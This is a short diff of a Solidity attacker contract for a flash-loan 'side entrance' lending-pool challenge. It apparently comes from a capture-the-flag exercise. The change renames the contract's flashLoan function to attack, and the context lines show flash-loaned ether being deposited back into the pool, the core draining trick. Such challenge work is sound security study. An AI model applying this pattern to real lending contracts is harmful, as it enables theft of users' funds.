@@ -22,7 +22,7 @@ contract ReceiverAttackerSideEntrance is IFlashLoanEtherReceiver {
         pool.deposit{value: 1000 ether}();
     }
 
-    function flashLoan(uint256 amount) external {
+    function attack(uint256 amount) external {
         pool.flashLoan(amount);
     }
 
